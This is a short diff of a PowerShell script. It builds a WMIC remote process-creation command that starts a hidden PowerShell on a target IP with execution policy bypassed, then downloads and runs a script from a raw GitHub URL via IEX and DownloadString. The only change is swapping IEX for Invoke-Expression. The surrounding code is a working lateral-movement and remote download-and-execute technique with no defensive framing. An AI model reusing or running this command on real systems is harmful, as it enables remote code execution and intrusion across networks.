@@ -4,7 +4,7 @@ $website = 'https://raw.githubusercontent.com/JosephKer/puddin/master/Powershell
 $command = 'wmic /node:' + $IP + ' ' +'process call create "powershell.exe -exec bypass -NoP -Noni -Win hidden IEX (New-Object Net.WebClient).DownloadString('+ "'"  + $website + "'" +')|Out-file C:\\Users\\public\\a.txt"'
 
 try {
-IEX $command -ErrorAction stop
+Invoke-Expression $command -ErrorAction stop
 } catch {
 Write-host 'wmic did not run'
 }
